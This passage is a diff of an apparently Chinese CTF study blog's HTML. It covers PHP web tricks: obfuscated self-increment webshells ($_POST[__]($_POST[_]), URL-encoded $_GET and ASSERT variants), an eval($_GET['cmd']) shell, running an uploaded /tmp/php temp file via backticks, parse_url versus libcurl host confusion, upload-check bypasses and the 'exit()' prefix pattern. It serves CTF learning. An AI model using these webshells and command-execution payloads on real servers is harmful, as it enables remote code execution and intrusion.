class="hljs-variable">$_</span>++;    <span class="hljs-regexp">//</span>R<br><span class="hljs-variable">$%</span><span class="hljs-variable constant_">DE</span>.=++<span class="hljs-variable">$_</span>;   <span class="hljs-regexp">//</span>_POS<br><span class="hljs-variable">$%</span><span class="hljs-variable constant_">DE</span>.=++<span class="hljs-variable">$_</span>;   <span class="hljs-regexp">//</span>_POST<br><span class="hljs-variable">$$</span>%<span class="hljs-variable constant_">DE</span>[__](<span class="hljs-variable">$$</span>%<span class="hljs-variable constant_">DE</span>[_]);  <span class="hljs-regexp">//</span><span class="hljs-variable">$_POST</span>[__](<span class="hljs-variable">$_POST</span>[_])<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs ruby"><span class="hljs-variable">$%</span><span class="hljs-variable constant_">DF</span>=(_/_._)[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;_&#x27;</span>];<span class="hljs-regexp">//</span><span class="hljs-variable constant_">NAN</span>
+<span class="hljs-variable">$_</span>=++<span class="hljs-variable">$%</span><span class="hljs-variable constant_">DF</span>;    <span class="hljs-regexp">//</span>O
+<span class="hljs-variable">$%</span><span class="hljs-variable constant_">DE</span>=_;     <span class="hljs-regexp">//</span>_
+<span class="hljs-variable">$%</span><span class="hljs-variable constant_">DE</span>.=++<span class="hljs-variable">$_</span>.<span class="hljs-variable">$%</span><span class="hljs-variable constant_">DF</span>;   <span class="hljs-regexp">//</span>_P
+<span class="hljs-variable">$_</span>++;   <span class="hljs-regexp">//</span>Q
+<span class="hljs-variable">$_</span>++;    <span class="hljs-regexp">//</span>R
+<span class="hljs-variable">$%</span><span class="hljs-variable constant_">DE</span>.=++<span class="hljs-variable">$_</span>;   <span class="hljs-regexp">//</span>_POS
+<span class="hljs-variable">$%</span><span class="hljs-variable constant_">DE</span>.=++<span class="hljs-variable">$_</span>;   <span class="hljs-regexp">//</span>_POST
+<span class="hljs-variable">$$</span>%<span class="hljs-variable constant_">DE</span>[__](<span class="hljs-variable">$$</span>%<span class="hljs-variable constant_">DE</span>[_]);  <span class="hljs-regexp">//</span><span class="hljs-variable">$_POST</span>[__](<span class="hljs-variable">$_POST</span>[_])</code></pre></div>
 
-<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mel">#Boogipop大佬自增的结果<br><br>%24_%3d%5b%5d.%5b%5d%3b%24__%3d%27%27%3b%24_%3d%24_%5b%27%27%5d%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__%3d%24_.%24__%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24%7b%27_%27.%24__%7d%5b_%5d(%24%7b%27_%27.%24__%7d%5b__%5d)%3b<br><span class="hljs-comment">//$_GET[&#x27;_&#x27;]($_GET[&#x27;__&#x27;]);</span><br><br><br><br><span class="hljs-comment">//ASSERT($_POST[_]);   php小于7</span><br>%24_%3d%5b%5d%3b%24_%3d%40%22%24_%22%3b%24_%3d%24_%5b%27!%27%3d%3d%27%40%27%5d%3b%24___%3d%24_%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24____%3d%27_%27%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24_%3d%24%24____%3b%24___(%24_%5b_%5d)%3b<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs mel">#Boogipop大佬自增的结果
+
+%24_%3d%5b%5d.%5b%5d%3b%24__%3d%27%27%3b%24_%3d%24_%5b%27%27%5d%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__%3d%24_.%24__%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24%7b%27_%27.%24__%7d%5b_%5d(%24%7b%27_%27.%24__%7d%5b__%5d)%3b
+<span class="hljs-comment">//$_GET[&#x27;_&#x27;]($_GET[&#x27;__&#x27;]);</span>
+
+
+
+<span class="hljs-comment">//ASSERT($_POST[_]);   php小于7</span>
+%24_%3d%5b%5d%3b%24_%3d%40%22%24_%22%3b%24_%3d%24_%5b%27!%27%3d%3d%27%40%27%5d%3b%24___%3d%24_%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24____%3d%27_%27%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24_%3d%24%24____%3b%24___(%24_%5b_%5d)%3b</code></pre></div>
 
 <h4 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h4><p><code>?</code>    <code>*</code></p>
 <h2 id="缓存文件"><a href="#缓存文件" class="headerlink" title="缓存文件"></a>缓存文件</h2><p><code>/tmp/phpxxxxxx</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];
+<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);</code></pre></div>
 
 <p>文件上传后首先会保存为临时文件<code>/tmp/phpxxxxxx</code></p>
 <p>执行该文件</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>md=<span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`. /tmp/phpxxxxxx`</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>md=<span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`. /tmp/phpxxxxxx`</span></code></pre></div>
 
-<h3 id="2023cnss新生赛"><a href="#2023cnss新生赛" class="headerlink" title="2023cnss新生赛"></a>2023cnss新生赛</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment">#door.php</span><br><br>&lt;<span class="hljs-string">?=</span>. /<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br></code></pre></td></tr></table></figure>
+<h3 id="2023cnss新生赛"><a href="#2023cnss新生赛" class="headerlink" title="2023cnss新生赛"></a>2023cnss新生赛</h3><div class="code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment">#door.php</span>
+
+&lt;<span class="hljs-string">?=</span>. /<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span></code></pre></div>
 
 <p>在door.php路由下上传php文件</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">------WebKitFormBoundaryQe3H2A18XpuKlHGT</span><br>Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;1.php&quot;<br>Content-<span class="hljs-keyword">Type</span>: application/octet-stream<br><br>#!/bin/bash<br>ls<br><span class="hljs-comment">------WebKitFormBoundaryQe3H2A18XpuKlHGT</span><br>Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;;<br><br>提交<br><span class="hljs-comment">------WebKitFormBoundaryQe3H2A18XpuKlHGT--</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-comment">------WebKitFormBoundaryQe3H2A18XpuKlHGT</span>
+Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;1.php&quot;
+Content-<span class="hljs-keyword">Type</span>: application/octet-stream
+
+#!/bin/bash
+ls
+<span class="hljs-comment">------WebKitFormBoundaryQe3H2A18XpuKlHGT</span>
+Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;;
+
+提交
+<span class="hljs-comment">------WebKitFormBoundaryQe3H2A18XpuKlHGT--</span></code></pre></div>
 
 <h2 id="pathinfo-漏洞"><a href="#pathinfo-漏洞" class="headerlink" title="pathinfo()漏洞"></a>pathinfo()漏洞</h2><p><code>/</code>获取文件名，根据<code>.</code>获取文件后缀</p>
 <p><code>1.php/.</code></p>
 <p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901212548383.png" srcset="/img/loading.gif" lazyload alt="image-20230901212548383"></p>
-<h2 id="parse-url解析漏洞"><a href="#parse-url解析漏洞" class="headerlink" title="parse_url解析漏洞"></a>parse_url解析漏洞</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs scss">php parse_url<br>最后一个@后的为host<br><br>libcurl<br>第一个@后的host<br><br><span class="hljs-attribute">http</span>://<span class="hljs-attribute">u</span>:p<span class="hljs-keyword">@a</span>.<span class="hljs-attribute">com</span>:<span class="hljs-number">80</span><span class="hljs-keyword">@b</span>.com/<br><br>php解析结果：<br>    <span class="hljs-attribute">schema</span>: http <br>    <span class="hljs-attribute">host</span>: b.com<br>    <span class="hljs-attribute">user</span>: u<br>    <span class="hljs-attribute">pass</span>: p<span class="hljs-keyword">@a</span>.<span class="hljs-attribute">com</span>:<span class="hljs-number">80</span><br>libcurl解析结果：<br>    <span class="hljs-attribute">schema</span>: http<br>    <span class="hljs-attribute">host</span>: a.com<br>    <span class="hljs-attribute">user</span>: u<br>    <span class="hljs-attribute">pass</span>: p<br>    <span class="hljs-attribute">port</span>: <span class="hljs-number">80</span><br>    后面的<span class="hljs-keyword">@b</span>.com/会被忽略掉<br></code></pre></td></tr></table></figure>
+<h2 id="parse-url解析漏洞"><a href="#parse-url解析漏洞" class="headerlink" title="parse_url解析漏洞"></a>parse_url解析漏洞</h2><div class="code-wrapper"><pre><code class="hljs scss">php parse_url
+最后一个@后的为host
+
+libcurl
+第一个@后的host
+
+<span class="hljs-attribute">http</span>://<span class="hljs-attribute">u</span>:p<span class="hljs-keyword">@a</span>.<span class="hljs-attribute">com</span>:<span class="hljs-number">80</span><span class="hljs-keyword">@b</span>.com/
+
+php解析结果：
+    <span class="hljs-attribute">schema</span>: http 
+    <span class="hljs-attribute">host</span>: b.com
+    <span class="hljs-attribute">user</span>: u
+    <span class="hljs-attribute">pass</span>: p<span class="hljs-keyword">@a</span>.<span class="hljs-attribute">com</span>:<span class="hljs-number">80</span>
+libcurl解析结果：
+    <span class="hljs-attribute">schema</span>: http
+    <span class="hljs-attribute">host</span>: a.com
+    <span class="hljs-attribute">user</span>: u
+    <span class="hljs-attribute">pass</span>: p
+    <span class="hljs-attribute">port</span>: <span class="hljs-number">80</span>
+    后面的<span class="hljs-keyword">@b</span>.com/会被忽略掉</code></pre></div>
 
 <h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="finfo-open-（检查文件头，十六进制第一行信息）"><a href="#finfo-open-（检查文件头，十六进制第一行信息）" class="headerlink" title="finfo_open  （检查文件头，十六进制第一行信息）"></a>finfo_open  （检查文件头，十六进制第一行信息）</h3><p>修改后缀不起作用</p>
-<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs lsl">finfo_open的参数   控制返回结果<br><br>FILEINFO_NONE (<span class="hljs-type">integer</span>)<br>无特殊处理。<br>FILEINFO_SYMLINK (<span class="hljs-type">integer</span>)<br>跟随符号链接。<br>FILEINFO_MIME_TYPE (<span class="hljs-type">integer</span>)<br>返回 mime 类型。 自 PHP <span class="hljs-number">5.3</span><span class="hljs-number">.0</span> 可用。<br>FILEINFO_MIME_ENCODING (<span class="hljs-type">integer</span>)<br>返回文件的 mime 编码。 自 PHP <span class="hljs-number">5.3</span><span class="hljs-number">.0</span> 可用。<br>FILEINFO_MIME (<span class="hljs-type">integer</span>)<br>按照 RFC <span class="hljs-number">2045</span> 定义的格式返回文件 mime 类型和编码。<br>FILEINFO_COMPRESS (<span class="hljs-type">integer</span>)<br>解压缩压缩文件。 由于线程安全问题，自 PHP <span class="hljs-number">5.3</span><span class="hljs-number">.0</span> 禁用。<br>FILEINFO_DEVICES (<span class="hljs-type">integer</span>)<br>查看设备的块内容或字符。<br>FILEINFO_CONTINUE (<span class="hljs-type">integer</span>)<br>返回全部匹配的类型。<br>FILEINFO_PRESERVE_ATIME (<span class="hljs-type">integer</span>)<br>如果可以的话，尽可能保持原始的访问时间。<br>FILEINFO_RAW (<span class="hljs-type">integer</span>)<br>对于不可打印字符不转换成 \ooo 八进制表示格式。<br>FILEINFO_EXTENSION (<span class="hljs-type">integer</span>)<br>根据 MIME 类型返回适当的文件扩展名。 有的文件类型具有多种扩展名，例如 JPEG 将会返回多个扩展名， 以斜杠分隔，比如 <span class="hljs-string">&quot;jpeg/jpg/jpe/jfif&quot;</span>。 如果在 magic.mime 数据库里类型未知，则返回的是 <span class="hljs-string">&quot;???&quot;</span>。 PHP <span class="hljs-number">7.2</span><span class="hljs-number">.0</span> 起有效。<br><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs lsl">finfo_open的参数   控制返回结果
+
+FILEINFO_NONE (<span class="hljs-type">integer</span>)
+无特殊处理。
+FILEINFO_SYMLINK (<span class="hljs-type">integer</span>)
+跟随符号链接。
+FILEINFO_MIME_TYPE (<span class="hljs-type">integer</span>)
+返回 mime 类型。 自 PHP <span class="hljs-number">5.3</span><span class="hljs-number">.0</span> 可用。
+FILEINFO_MIME_ENCODING (<span class="hljs-type">integer</span>)
+返回文件的 mime 编码。 自 PHP <span class="hljs-number">5.3</span><span class="hljs-number">.0</span> 可用。
+FILEINFO_MIME (<span class="hljs-type">integer</span>)
+按照 RFC <span class="hljs-number">2045</span> 定义的格式返回文件 mime 类型和编码。
+FILEINFO_COMPRESS (<span class="hljs-type">integer</span>)
+解压缩压缩文件。 由于线程安全问题，自 PHP <span class="hljs-number">5.3</span><span class="hljs-number">.0</span> 禁用。
+FILEINFO_DEVICES (<span class="hljs-type">integer</span>)
+查看设备的块内容或字符。
+FILEINFO_CONTINUE (<span class="hljs-type">integer</span>)
+返回全部匹配的类型。
+FILEINFO_PRESERVE_ATIME (<span class="hljs-type">integer</span>)
+如果可以的话，尽可能保持原始的访问时间。
+FILEINFO_RAW (<span class="hljs-type">integer</span>)
+对于不可打印字符不转换成 \ooo 八进制表示格式。
+FILEINFO_EXTENSION (<span class="hljs-type">integer</span>)
+根据 MIME 类型返回适当的文件扩展名。 有的文件类型具有多种扩展名，例如 JPEG 将会返回多个扩展名， 以斜杠分隔，比如 <span class="hljs-string">&quot;jpeg/jpg/jpe/jfif&quot;</span>。 如果在 magic.mime 数据库里类型未知，则返回的是 <span class="hljs-string">&quot;???&quot;</span>。 PHP <span class="hljs-number">7.2</span><span class="hljs-number">.0</span> 起有效。
+</code></pre></div>
 
 <p><code>finfo_file()</code>返回<code>finfo_open</code>设置的参数对应的信息</p>
 <h3 id="Getimagesize（检测文件头，读取文件的前八位的十六进制）"><a href="#Getimagesize（检测文件头，读取文件的前八位的十六进制）" class="headerlink" title="Getimagesize（检测文件头，读取文件的前八位的十六进制）"></a>Getimagesize（检测文件头，读取文件的前八位的十六进制）</h3><p>返回文件大小和文件类型</p>
@@ -405,22 +534,52 @@
 <p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901220943156.png" srcset="/img/loading.gif" lazyload alt="image-20230901220943156"></p>
 <p>成功识别</p>
 <h3 id="exif-imagetype-（GIF89a应该是用来饶过他的）"><a href="#exif-imagetype-（GIF89a应该是用来饶过他的）" class="headerlink" title="exif_imagetype   （GIF89a应该是用来饶过他的）"></a>exif_imagetype   （GIF89a应该是用来饶过他的）</h3><p>只是返回数字（数组中的索引）</p>
-<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">1	IMAGETYPE<span class="hljs-emphasis">_GIF</span><br><span class="hljs-emphasis">2	IMAGETYPE_JPEG</span><br><span class="hljs-emphasis">3	IMAGETYPE_PNG</span><br><span class="hljs-emphasis">4	IMAGETYPE_SWF</span><br><span class="hljs-emphasis">5	IMAGETYPE_PSD</span><br><span class="hljs-emphasis">6	IMAGETYPE_BMP</span><br><span class="hljs-emphasis">7	IMAGETYPE_TIFF_II（Intel 字节顺序）</span><br><span class="hljs-emphasis">8	IMAGETYPE_TIFF_MM（Motorola 字节顺序）</span><br><span class="hljs-emphasis">9	IMAGETYPE_JPC</span><br><span class="hljs-emphasis">10	IMAGETYPE_JP2</span><br><span class="hljs-emphasis">11	IMAGETYPE_JPX</span><br><span class="hljs-emphasis">12	IMAGETYPE_JB2</span><br><span class="hljs-emphasis">13	IMAGETYPE_SWC</span><br><span class="hljs-emphasis">14	IMAGETYPE_IFF</span><br><span class="hljs-emphasis">15	IMAGETYPE_WBMP</span><br><span class="hljs-emphasis">16	IMAGETYPE_</span>XBM<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs asciidoc">1	IMAGETYPE<span class="hljs-emphasis">_GIF</span>
+<span class="hljs-emphasis">2	IMAGETYPE_JPEG</span>
+<span class="hljs-emphasis">3	IMAGETYPE_PNG</span>
+<span class="hljs-emphasis">4	IMAGETYPE_SWF</span>
+<span class="hljs-emphasis">5	IMAGETYPE_PSD</span>
+<span class="hljs-emphasis">6	IMAGETYPE_BMP</span>
+<span class="hljs-emphasis">7	IMAGETYPE_TIFF_II（Intel 字节顺序）</span>
+<span class="hljs-emphasis">8	IMAGETYPE_TIFF_MM（Motorola 字节顺序）</span>
+<span class="hljs-emphasis">9	IMAGETYPE_JPC</span>
+<span class="hljs-emphasis">10	IMAGETYPE_JP2</span>
+<span class="hljs-emphasis">11	IMAGETYPE_JPX</span>
+<span class="hljs-emphasis">12	IMAGETYPE_JB2</span>
+<span class="hljs-emphasis">13	IMAGETYPE_SWC</span>
+<span class="hljs-emphasis">14	IMAGETYPE_IFF</span>
+<span class="hljs-emphasis">15	IMAGETYPE_WBMP</span>
+<span class="hljs-emphasis">16	IMAGETYPE_</span>XBM</code></pre></div>
 
-<h2 id="死亡代码"><a href="#死亡代码" class="headerlink" title="死亡代码"></a>死亡代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$filename</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-variable">$content</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$content</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="死亡代码"><a href="#死亡代码" class="headerlink" title="死亡代码"></a>死亡代码</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$filename</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];
+<span class="hljs-variable">$content</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];
+<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$content</span>);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p>建议看看Boogipop大佬的文章，讲的很好</p>
 <p>常规的我就不写了，写一下我没见过的</p>
